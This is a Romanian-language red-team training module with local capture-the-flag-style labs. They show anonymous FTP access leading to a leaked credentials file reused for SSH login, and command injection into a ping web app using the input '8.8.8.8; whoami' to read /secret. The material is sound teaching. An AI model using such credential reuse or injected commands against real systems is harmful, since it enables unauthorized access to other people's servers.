## Red Team

**Red Team** este acea echipa de specialisti care trebuie sa gandeasca asemeni unui atacator.
Echipa este fie interna companiei in care activeaza, fie externa si activeaza la cererea companiei ce cumpara serviciile lor.
Scopul lor este sa emuleze atacuri, sa documenteze tot procesul si apoi sa propuna modalitati de imbunatatire a securitatii.

Este o modalitate **legala** pentru specialisti sa isi puna in practica notiunile si sa ajute in acelasi timp la securizarea diferitelor entitati.

O parte din activitatile pe care **Red Team** le poate efectua sunt:

- Securitate fizica
  - Incearca sa intre in cladire, sa fure dispozitive, sa pacaleasca angajati
- Dumpster Diving
  - Cauta in gunoi documente sau postit-uri cu parole
- Social Engineering
  - Phishing
  - Email-uri malitioase
- OSINT
  - Inventarierea sistemelor companiei
  - Scanarea sistemelor companiei
  - Verificare daca emailurile companiei sunt compromise
- Exploatare activa a sistemelor
  - Utilizarea exploit-urilor publice
  - Inspectie manuala a serviciilor expuse

### Practice

Intrati in directorul `support/red-team/` si parcurgeti exercitiile de mai jos.

1. Accesati directorul `anonymous/remote/` si rulati comanda `make run`.
   Comanda va lansa in executie un container `Docker` aferent challenge-ului `anonymous`.
   
   Containerul expune doua porturi importante, si anume `10021` si `10022`.
   Portul `10021` expune serviciul `FTP` iar Portul `10022` expune serviciul `SSH`.
   Prima data vom interactiona cu serviciul `FTP`.

   Puteti interactiona cu serviciul `FTP` folosind comanda:
   
   ```
   $ ftp 0.0.0.0 10021
   ```
  
   Serverul are functionalitatea de `anonymous login` activata.
   Acest lucru este o practica gresita de aproape fiecare data si trebuie evitata.
   Se poate folosi doar in cazurile in care vrem sa expunem **in mod public** fisiere accesibile fara restrictii.
  
   Pentru mai multe detalii, accesati sectiunea `What is anonymous FTP` de la urmatorul link:
   
   - [How to Use Anonymous FTP](https://www.rfc-editor.org/rfc/rfc1635.html)
   
   Userul `anonymous` este un user limitat facut cu scopul de a oferi acces public unor anumite resurse.
   Informatia esentiala din resursa indicata este ca userul `anonymous` accepta orice parola.
   
   Drept urmare, putem folosi urmatoarea succesiune de actiuni in linie de comanda pentru a ne conecta la serverul ce ruleaza local:
   
   ```
   $ ftp 0.0.0.0 10021
   # introduceti manual: user: anonymous
   # introduceti manual: password: pass
   ```
   
   Rezultatul ar trebui sa fie:
   
   ```
   Connected to 0.0.0.0.
   220 (vsFTPd 3.0.3)
   Name (0.0.0.0:long): anonymous
   331 Please specify the password.
   Password: 
   230 Login successful.
   Remote system type is UNIX.
   Using binary mode to transfer files.
   ftp>
   ```
   
   Pentru a lista fisierele la care avem acces, folositi comanda `passive on` urmata de comanda `ls`.
   Rezultatul ar trebui sa fie:
   
   ```
   ftp> passive on
   Passive mode: on; fallback to active mode: off.
   ftp> ls
   229 Entering Extended Passive Mode (|||65455|)
   150 Here comes the directory listing.
   -rw-r--r--    1 0        0              27 Oct 31 14:21 credentials.txt
   226 Directory send OK.
   ftp>
   ```
   
   Observam ca serverul expune fisierul `credentials.txt`.
   Deseori programatorii uita ce fisiere lasa publice si se pot ajunge la situatii nedorite.
   
   Cum accesul la fisier este nerestrictionat, acesta poate fi downloadat folosind comanda `get credentials.txt`.
   Rezultatul ar trebui sa fie:
   
   ```
   ftp> get credentials.txt
   local: credentials.txt remote: credentials.txt
   229 Entering Extended Passive Mode (|||65437|)
   150 Opening BINARY mode data connection for credentials.txt (27 bytes).
   100% |******************************************************************************************************************************************|    27        0.42 KiB/s    00:00 ETA
   226 Transfer complete.
   27 bytes received in 00:00 (0.41 KiB/s) 
   ```
   
   Acum putem folosi comanda `exit` pentru a inchide conexiunea cu serverul `FTP`.
   Rezultatul ar trebui sa fie:
   
   ```
   ftp> exit
   221 Goodbye.
   ```

   Acum avem local fisierul `credentials.txt` al carui continut il putem expune cu urmatoarea comanda:
   
   ```
   $ cat credentials.txt
   ```
   
   Rezultatul ar trebui sa fie:
   
   ```
   $ cat credentials.txt
   ctf:anonymous-account-pass
   ```
  
   Cea mai des folosita sintaxa de precizare a credentialelor este de forma `username:parola`.
   Observam ca asta contine si fisierul nostru.
   
   Acum putem incerca sa folosim credentialele pentru a ne loga prin intermediul `SSH`.
   Vom face acest lucru cu userul `ctf` si parola `anonymous-account-pass`.
   Comanda folosita este:
   
   ```
   ssh ctf@0.0.0.0 -p 10022
   # introducem manual parola `anonymous-account-pass`
   # introducem manual `yes` pentru a continua conectarea atunci cand suntem intrebati
   ```
   
   Rezultatul ar trebui sa fie:
   
   ```
   $ ssh ctf@0.0.0.0 -p 10022
   The authenticity of host '[0.0.0.0]:10022 ([0.0.0.0]:10022)' can't be established.
   ED25519 key fingerprint is SHA256:r4/eDTkhYoYa8fgSaLMUsyQJAGsSaq+5rX2FGAB0CJc.
   This key is not known by any other names
   Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
   Warning: Permanently added '[0.0.0.0]:10022' (ED25519) to the list of known hosts.
   ctf@0.0.0.0's password: 
   Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-52-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage

   This system has been minimized by removing packages and content that are
   not required on a system that users do not log into.

   To restore this content, you can run the 'unminimize' command.

   The programs included with the Ubuntu system are free software;
   the exact distribution terms for each program are described in the
   individual files in /usr/share/doc/*/copyright.

   Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
   applicable law.


   The programs included with the Ubuntu system are free software;
   the exact distribution terms for each program are described in the
   individual files in /usr/share/doc/*/copyright.
   
   Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
   applicable law.

   ctf@03ca22e3acdb:~$
   ```
   
   Listati continutul fisierului `secret` disponibil la calea `/home/ctf/secret`.
   
   Odata ce aveti un input care functioneaza corespunzator, incercati acelasi input si la adresa TODO.
   
1. Accesati directorul `pingme/remote/` si rulati comanda `make run`.
   Comanda va lansa in executie un container `Docker` aferent challenge-ului `pingme`.
   O aplicatie web minimala este expusa pe portul `10002` al masinii locale.
   
   Observati ca aplicatia executa comanda `ping` catre o adresa IP data de utilizator.

   Putem presupune ca aplicatia executa intr-o linie de comanda pe server urmatoarea comanda:
   
   ```
   $ ping <input>
   ```

   Unde `<input>` este orice introduce utilizatorul in campul din pagina.
   In consecinta, un utilizator al aplicatiei **injecteaza comenzi** direct intr-o linie de comanda aflata pe un server la distanta.
   
   Cunoscand faptul ca operatorul `;` delimiteaza comenzi si permite rularea mai multor comenzi intr-o singura linie, putem folosi `8.8.8.8; whoami` ca si input.
   In acest fel, comenzile care s-ar executa pe server conform presupunerilor noastre sunt:
   
   ```
   $ ping 8.8.8.8; whoami
   ```
 
   Validati presupunerile anterioare contra aplicatiei expuse pe `0.0.0.0:10002`.
   
   Scopul este sa accesati fisierul `/secret` de pe server.
   Pentru a accesa acest fisier, folositi utilitarul `cat` si faptul ca aveti informatia ca fisierul cautat se afla sub calea `/secret`.
   
   Odata ce aveti un input care functioneaza corespunzator, incercati acelasi input si la adresa TODO.

### Quiz

[Quiz](../quiz/red-team.md)
